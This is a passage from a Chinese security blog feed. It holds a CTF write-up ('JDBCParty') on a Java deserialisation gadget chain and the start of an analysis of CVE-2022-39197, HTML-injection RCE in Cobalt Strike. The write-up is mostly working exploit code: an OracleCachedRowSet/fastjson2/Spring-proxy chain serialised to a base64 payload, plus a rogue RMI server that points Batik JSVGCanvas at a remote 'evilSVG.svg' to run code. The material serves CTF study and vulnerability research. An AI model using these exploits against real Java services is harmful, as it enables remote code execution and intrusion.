</span><br><span class="line">        vector2.add(<span class="number">0</span>,<span class="string">&quot;222&quot;</span>);  </span><br><span class="line">        String[] metaData= <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;111&quot;</span>,<span class="string">&quot;222&quot;</span>&#125;;  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnIndexes&quot;</span>),vector1);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnNames&quot;</span>),vector2);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;metaData&quot;</span>),metaData);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;reader&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;writer&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;syncProvider&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        jsonObject.put(<span class="string">&quot;n4c1&quot;</span>, oracleCachedRowSet);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();  </span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);  </span><br><span class="line">        <span class="comment">/////////////  </span></span><br><span class="line">        vector.add(jsonObject);  </span><br><span class="line">        setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tools.serialize2base64(list);  </span><br><span class="line">        System.out.println(poc);  </span><br><span class="line">        Tools.string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> obj.getClass();  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                field = c.getDeclaredField(fieldName);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;  </span><br><span class="line">                c = c.getSuperclass();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object val)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">dField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);  </span><br><span class="line">        dField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        dField.set(obj, val);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题:"></a>遇到的问题:</h3><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><p>OK, 当我们直接写出这条链然后测试会发现, 确实触发到了getter, 但是在getConnection之前就触发了getCursorName(), 这个方法直接抛出错误<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251002180349.png" alt="image.png"></p><h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><p>当我使用jackson来替换fastjson2时, 发现在序列化时就触发getConnection(), 导致生成不了poc</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>由于题目存在spring依赖, 那么第一时间考虑的方法就是使用<code>JdkDynamicAopProxy</code>动态代理, 这个方法在 # 高版本Fastjson在Java原生反序列化 和 稳定jackson反序列化触发getter时都有用到<br>参考<br><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"># 关于java反序列化中jackson链子不稳定问题</a><br>getConnection的上层接口是RowSetInternal, 直接写出exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationConfig;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.OracleConnectionWrapper;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.driver.LogicalConnection;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.internal.OracleConnection;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.pool.OraclePooledConnection;  </span><br><span class="line"><span class="keyword">import</span> org.apache.batik.swing.JSVGCanvas;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONObject;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.rowset.OracleCachedRowSet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;  </span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> java.util.Vector;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.n4c1.tools.advanced.UnSafeTools;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;  </span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.RowSetInternal;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="comment">//import org.springframework.aop.framework.JdkDynamicAopProxy  </span></span><br><span class="line"><span class="keyword">import</span>  org.n4c1.tools.Tools;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.bypassModule(Test.class, Class.class);  </span><br><span class="line">        <span class="type">OracleCachedRowSet</span> <span class="variable">oracleCachedRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OracleCachedRowSet</span>();  </span><br><span class="line">  </span><br><span class="line">        oracleCachedRowSet.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/cwx0mc&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;monitorLock&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();  </span><br><span class="line">        vector1.add(<span class="number">0</span>,<span class="string">&quot;111&quot;</span>);  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();  </span><br><span class="line">        vector2.add(<span class="number">0</span>,<span class="string">&quot;222&quot;</span>);  </span><br><span class="line">        String[] metaData= <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;111&quot;</span>,<span class="string">&quot;222&quot;</span>&#125;;  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnIndexes&quot;</span>),vector1);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnNames&quot;</span>),vector2);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;metaData&quot;</span>),metaData);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;reader&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;writer&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;syncProvider&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);  </span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();  </span><br><span class="line">        advisedSupport.setTarget(oracleCachedRowSet);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;RowSetInternal.class&#125;, handler);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        jsonObject.put(<span class="string">&quot;n4c1&quot;</span>, proxyObj);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();  </span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);  </span><br><span class="line">        <span class="comment">/////////////  </span></span><br><span class="line">        vector.add(jsonObject);  </span><br><span class="line">        setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tools.serialize2base64(list);  </span><br><span class="line">        System.out.println(poc);  </span><br><span class="line">        Tools.string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> obj.getClass();  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                field = c.getDeclaredField(fieldName);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;  </span><br><span class="line">                c = c.getSuperclass();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object val)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">dField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);  </span><br><span class="line">        dField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        dField.set(obj, val);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样生成的poc就可以完美触发到getConnection<br>之后就是伪造rmi server</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.apache.batik.swing.JSVGCanvas&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,  </span><br><span class="line">                <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;URI=test&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;URI&quot;</span>, <span class="string">&quot;http://127.0.0.1:8001/evilSVG.svg&quot;</span>));  </span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);  </span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于是高版本jdk, 有module限制, rmiServer在编译和运行时分别需要设置命令行参数和jvm参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-modules jdk.naming.rmi --add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251002210612.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251002210632.png" alt="image.png"><br>之后按照[[CVE-2022-39197 CS RCE]]构造jar包和svg即可RCE<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251002210936.png" alt="image.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://xz.aliyun.com/news/14169">https://xz.aliyun.com/news/14169</a><br><a href="https://nlrvana.github.io/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E8%B5%9B-jdbcparty/">https://nlrvana.github.io/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E8%B5%9B-jdbcparty/</a><br><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B">https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B</a><br><a href="https://www.ctfiot.com/223628.html">https://www.ctfiot.com/223628.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JDBCParty&quot;&gt;&lt;a href=&quot;#JDBCParty&quot; class=&quot;headerlink&quot; title=&quot;JDBCParty&quot;&gt;&lt;/a&gt;JDBCParty&lt;/h2&gt;&lt;p&gt;题目存在明显反序列化点&lt;/p&gt;
&lt;h3 id=&quot;考点&quot;&gt;&lt;a href=&quot;#考点&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2022-39197 CS RCE</title>
    <link href="http://example.com/2025/10/02/CVE-2022-39197-CS-RCE/"/>
    <id>http://example.com/2025/10/02/CVE-2022-39197-CS-RCE/</id>
    <published>2025-10-02T13:10:39.000Z</published>
    <updated>2025-10-02T13:10:59.382Z</updated>
    
    <content type="html"><![CDATA[<p>影响范围：</p><ul><li>Cobalt Strike &lt;&#x3D; 4.7</li></ul><p>漏洞原文：<a href="https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/">https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/</a></p><h2 id="Swing框架"><a href="#Swing框架" class="headerlink" title="Swing框架"></a>Swing框架</h2><p>这个漏洞本质上是java自带的GUI组件swing的html注入</p><p>demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;  </span><br><span class="line"><span class="keyword">import</span> java.awt.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SwingDemo</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">JFrame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JFrame</span>(<span class="string">&quot;SwingDemo&quot;</span>);  </span><br><span class="line">        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);  </span><br><span class="line">        frame.setPreferredSize(<span class="keyword">new</span> <span class="title class_">Dimension</span>(<span class="number">400</span>, <span class="number">400</span>));  </span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">label</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;&lt;html&gt;&lt;img scr=x&gt;&lt;/html&gt;&quot;</span>);  </span><br><span class="line">        frame.getContentPane().add(label);  </span><br><span class="line">        frame.pack();  </span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此demo可解析img标签<br>这个漏洞涉及到的一些类</p><p><code>HTMLEditorKit</code>:    <em><strong>读取、渲染、编辑</strong></em> HTML，是实现功能的“引擎”。<strong>工具&#x2F;控制器</strong> (View-Controller)<br><strong><code>HTMLDocument</code></strong>:      <em><strong>存储</strong></em> HTML 的结构和内容，是数据的“容器”。<strong>数据模型</strong> (Model)<br><strong><code>HTML</code></strong>:                  定义所有 HTML 标签和属性的常量。<strong>常量&#x2F;标识符</strong></p><p>首先就是<code>javax.swing.text.html.HTML</code></p><p>它的静态内部类Tag的静态代码块中实例化了很多标签类<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250927192629.png" alt="image.png"></p><p>在<code>javax.swing.text.html.HTMLDocument$HTMLReader</code>中, 为每个tag映射了对应的TagAction</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250927193735.png" alt="image.png"><br><code>TagAction</code>定义了<code>start()</code>和<code>end()</code>方法, 对应了每个标签起始和结束都需要做什么</p><p>之后是<code>javax.swing.text.html.HTMLEditorKit$HTMLFactory#create</code><br>此处为不同的 Tag 创建了不同的view视图<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250927204931.png" alt="image.png"><br>除了正常的HTML标签之外, 这里还有一个名为<code>OBJECT</code>的标签, 并为其创建了<code>ObjectView</code><br>在它的<code>createComponent</code>方法中, 存在类实例化的操作</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250927221351.png" alt="image.png"><br>根据第106行, 被加载的类需要继承<code>java.awt.Component</code><br>根据107行, 被加载的类需要有一个无参构造器</p><p>其中的<code>setParameters</code>中更是存在遍历setter方法调用,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250927221518.png" alt="image.png"><br>根据<code>ObjectView</code>类代码中的文档注释, 其使用方法如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A simple example HTML invocation is:</span><br><span class="line">       &lt;object classid=&quot;javax.swing.JLabel&quot;&gt;</span><br><span class="line">       &lt;param name=&quot;text&quot; value=&quot;sample text&quot;&gt;</span><br><span class="line">       &lt;/object&gt;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>以上条件加起来: </p><ol><li>一个继承于Component的类，其中必须包含无参的构造方法。</li><li>这个类中需要有一个setXXX方法，这个方法必须只接受一个参数，而且可以接受String类型。</li></ol><p>最终作者找到的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.batik.swing.JSVGCanvas--&gt;setURI</span><br></pre></td></tr></table></figure><p>org.apache.batik 来自batik-swing, 也是CS的一个依赖</p><p>我们测试时引入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xmlgraphics<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>batik-swing<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转到这个方法中, 我们发现它可以通过参数url去加载SVG</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250929000050.png" alt="image.png"></p><p>这个地方是可以进行RCE的:<br><a href="https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html">https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html</a></p><p>按照文章中的内容, 构造jar包,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250929213325.png" alt="image.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 